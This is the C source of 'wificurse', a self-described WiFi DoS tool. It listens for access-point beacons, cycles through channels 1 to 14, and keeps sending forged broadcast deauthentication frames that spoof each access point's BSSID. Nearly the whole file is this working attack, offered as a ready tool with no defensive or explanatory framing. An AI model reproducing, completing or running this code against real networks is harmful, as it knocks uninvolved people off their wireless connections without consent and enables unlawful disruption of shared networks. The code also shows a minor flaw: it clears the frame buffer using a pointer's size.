/*
    wificurse - WiFi DoS tool
    Copyright (C) 2012  oblique

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <poll.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include "iw.h"
#include "error.h"
#include "console.h"
#include "ap_list.h"
#include "channelset.h"
#include "wificurse.h"


static volatile int stop;

struct deauth_thread_args {
	struct ap_list *apl;
	struct iw_dev *dev;
	pthread_mutex_t *mutex_chan;
	pthread_mutex_t *mutex_list;
	channelset_t *chans_fixed;
	channelset_t *chans;
};

int send_deauth(struct iw_dev *dev, struct access_point *ap) {
	struct mgmt_frame *deauth;
	uint16_t *reason;
	ssize_t r;

	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
	if (deauth == NULL)
		return_error("malloc");

	memset(deauth, 0, sizeof(deauth));
	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
	memcpy(deauth->src_mac, ap->info.bssid, IFHWADDRLEN);
	memcpy(deauth->bssid, ap->info.bssid, IFHWADDRLEN);
	reason = (uint16_t*)&deauth->frame_body;
	/* reason 7: Class 3 frame received from nonassociated STA */
	*reason = 7;

	/* send deauth */
	deauth->sc.sequence = ap->sequence++;
	do {
		r = iw_write(dev, deauth, sizeof(*deauth) + sizeof(*reason));
	} while (r == ERRAGAIN);
	if (r < 0) {
		free(deauth);
		return r;
	}

	free(deauth);

	return 0;
}

int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
	uint8_t buf[4096], *pkt;
	size_t pkt_sz;
	ssize_t r, tmp, n;
	struct mgmt_frame *beacon;
	struct beacon_frame_body *beacon_fb;
	struct info_element *beacon_ie;

	r = iw_read(dev, buf, sizeof(buf), &pkt, &pkt_sz);
	if (r < 0)
		return r;

	beacon = (struct mgmt_frame*)pkt;

	/* if it's a beacon packet */
	if (beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
		memcpy(api->bssid, beacon->bssid, IFHWADDRLEN);
		beacon_fb = (struct beacon_frame_body*)beacon->frame_body;
		beacon_ie = beacon_fb->infos;
		api->essid[0] = '\0';
		n = 0;

		/* parse beacon */
		while (1) {
			if (beacon_ie->id == INFO_ELEMENT_ID_SSID) { /* SSID found */
				tmp = beacon_ie->len < ESSID_LEN ? beacon_ie->len : ESSID_LEN;
				memcpy(api->essid, beacon_ie->info, tmp);
				api->essid[tmp] = '\0';
				n |= 1;
			} else if (beacon_ie->id == INFO_ELEMENT_ID_DS) { /* channel number found */
				api->chan = beacon_ie->info[0];
				n |= 2;
			}
			if (n == (1|2))
				break;
			/* next beacon element */
			beacon_ie = (struct info_element*)&beacon_ie->info[beacon_ie->len];
			if ((uintptr_t)beacon_ie - (uintptr_t)buf >= r)
				break;
		}

		/* if we didn't found the channel number
		 * or if the channel number is not in interference range
		 * then return ERRNODATA
		 */
		if (!(n & 2) || api->chan < dev->chan-2 || api->chan > dev->chan+2)
			return ERRNODATA;

		return 0;
	}

	return ERRNODATA;
}

void *deauth_thread_func(void *arg) {
	struct deauth_thread_args *ta = arg;
	struct access_point *ap, *tmp;
	int i, j, b, tmp_chan;

	while (!stop) {
		pthread_mutex_lock(ta->mutex_chan);
		b = 0;
		for (i=0; i<60 && !stop; i++) {
			for (j=0; j<128 && !stop; j++) {
				ap = ta->apl->head;
				while (ap != NULL && !stop) {
					/* if the last beacon we got was 3 mins ago, remove AP */
					if (time(NULL) - ap->last_beacon_tm >= 3*60) {
						tmp_chan = ap->info.chan;
						tmp = ap;
						ap = ap->next;
						pthread_mutex_lock(ta->mutex_list);
						unlink_ap(ta->apl, tmp);
						free(tmp);
						/* if AP channel is not in chans_fixed and there isn't any
						 * other AP that use this channel, remove it from chans.
						 */
						if (!channel_isset(ta->chans_fixed, tmp_chan)) {
							tmp = ta->apl->head;
							while (tmp != NULL) {
								if (tmp->info.chan == tmp_chan)
									break;
								tmp = tmp->next;
							}
							if (tmp == NULL)
								channel_unset(ta->chans, tmp_chan);
						}
						pthread_mutex_unlock(ta->mutex_list);
						continue;
					}
					/* if interface and AP are in the same channel, send deauth */
					if (ap->info.chan == ta->dev->chan) {
						if (send_deauth(ta->dev, ap) < 0) {
							print_error();
							stop = 2; /* notify main thread that we got an error */
						}
						b = 1;
						ap->num_of_deauths++;
					}
					ap = ap->next;
				}
				/* if we have send deauth, sleep for 2000 microseconds */
				if (b && !stop)
					usleep(2000);
			}
			/* if we have send deauth, sleep for 180000 microseconds */
			if (b && !stop)
				usleep(180000);
		}
		pthread_mutex_unlock(ta->mutex_chan);
		/* small delay to avoid fast relock of mutex_chan */
		usleep(100);
	}

	return NULL;
}

int main(int argc, char *argv[]) {
	struct ap_list apl;
	struct ap_info api;
	struct iw_dev dev;
	struct pollfd pfd[2];
	struct deauth_thread_args ta;
	struct timeval tv1, tv2;
	suseconds_t msec;
	pthread_t deauth_thread;
	pthread_mutex_t mutex_chan, mutex_list;
	channelset_t chans_fixed, chans;
	int ret, sigfd, n, chan;
	sigset_t exit_sig;
	time_t tm;

	if (argc != 2) {
		fprintf(stderr, "\n  WiFi Curse v" VERSION " (C) 2012  oblique\n\n");
		fprintf(stderr, "  usage: wificurse <interface>\n\n");
		return EXIT_FAILURE;
	}

	if (getuid()) {
		fprintf(stderr, "Not root?\n");
		return EXIT_FAILURE;
	}

	/* init access point list */
	init_ap_list(&apl);

	/* init signals */
	sigemptyset(&exit_sig);
	sigaddset(&exit_sig, SIGINT);
	sigaddset(&exit_sig, SIGTERM);

	if (sigprocmask(SIG_BLOCK, &exit_sig, NULL) < 0) {
		err_msg("sigprocmask");
		return EXIT_FAILURE;
	}

	sigfd = signalfd(-1, &exit_sig, 0);
	if (sigfd < 0) {
		err_msg("signalfd");
		return EXIT_FAILURE;
	}

	pfd[0].fd = sigfd;
	pfd[0].revents = 0;
	pfd[0].events = POLLIN;

	/* init device */
	iw_init_dev(&dev);
	strncpy(dev.ifname, argv[1], sizeof(dev.ifname)-1);

	if (iw_open(&dev) < 0) {
		print_error();
		goto _errout_no_thread;
	}

	pfd[1].fd = dev.fd_in;
	pfd[1].revents = 0;
	pfd[1].events = POLLIN;

	/* init channel set */
	channel_zero(&chans_fixed);
	for (n=1; n<=14; n++)
		channel_set(&chans_fixed, n);
	channel_copy(&chans, &chans_fixed);

	/* set channel */
	n = 0;
	chan = 0;
	do {
		chan = (chan % CHANNEL_MAX) + 1;
		if (channel_isset(&chans, chan))
			ret = iw_set_channel(&dev, chan);
		else
			ret = -1;
		/* if fails try next channel */
	} while(++n < CHANNEL_MAX && ret < 0);
	if (ret < 0) {
		print_error();
		goto _errout_no_thread;
	}

	/* start deauth thread */
	stop = 0;
	ta.apl = &apl;
	ta.dev = &dev;
	ta.chans_fixed = &chans_fixed;
	ta.chans = &chans;
	pthread_mutex_init(&mutex_chan, NULL);
	ta.mutex_chan = &mutex_chan;
	pthread_mutex_init(&mutex_list, NULL);
	ta.mutex_list = &mutex_list;
	if (pthread_create(&deauth_thread, NULL, deauth_thread_func, &ta) < 0) {
		err_msg("pthread_create");
		goto _errout_no_thread;
	}

	clear_scr();
	update_scr(&apl, &dev);
	tm = time(NULL);
	gettimeofday(&tv1, NULL);

	while (!stop) {
		if (poll(pfd, 2, 0) < 0) {
			err_msg("poll");
			goto _errout;
		}

		if (pfd[0].revents & POLLIN) /* got SIGTERM or SIGINT */
			break;

		if (pfd[1].revents & POLLIN) {
			ret = read_ap_info(&dev, &api);
			if (ret < 0 && ret != ERRNODATA) { /* error */
				print_error();
				goto _errout;
			} else if (ret == 0) { /* got infos */
				channel_set(&chans, api.chan);
				pthread_mutex_lock(&mutex_list);
				if (add_or_update_ap(&apl, &api) < 0) {
					pthread_mutex_unlock(&mutex_list);
					print_error();
					goto _errout;
				}
				pthread_mutex_unlock(&mutex_list);
			}
		}

		gettimeofday(&tv2, NULL);
		if (tv2.tv_usec > tv1.tv_usec)
			msec = tv2.tv_usec - tv1.tv_usec;
		else
			msec = tv1.tv_usec - tv2.tv_usec;

		/* update screen every 0.5 second */
		if (msec >= 500000) {
			pthread_mutex_lock(&mutex_list);
			update_scr(&apl, &dev);
			pthread_mutex_unlock(&mutex_list);
			gettimeofday(&tv1, NULL);
		}

		/* change channel at least every 1 second */
		if (time(NULL) - tm >= 1) {
			n = 0;
			do {
				if (pthread_mutex_trylock(&mutex_chan) != 0) {
					n = -1;
					break;
				}
				chan = (chan % CHANNEL_MAX) + 1;
				if (channel_isset(&chans, chan))
					ret = iw_set_channel(&dev, chan);
				else
					ret = -1;
				pthread_mutex_unlock(&mutex_chan);
				/* if fails try next channel */
			} while(++n < CHANNEL_MAX && ret < 0);
			if (n != -1) {
				if (ret < 0) {
					print_error();
					goto _errout;
				}
				tm = time(NULL);
			}
		}
	}

	/* we got an error from deauth thread */
	if (stop == 2)
		goto _errout;

	printf("\nExiting..\n");
	stop = 1;
	pthread_join(deauth_thread, NULL);
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_SUCCESS;
_errout:
	stop = 1;
	pthread_join(deauth_thread, NULL);
_errout_no_thread:
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_FAILURE;
}
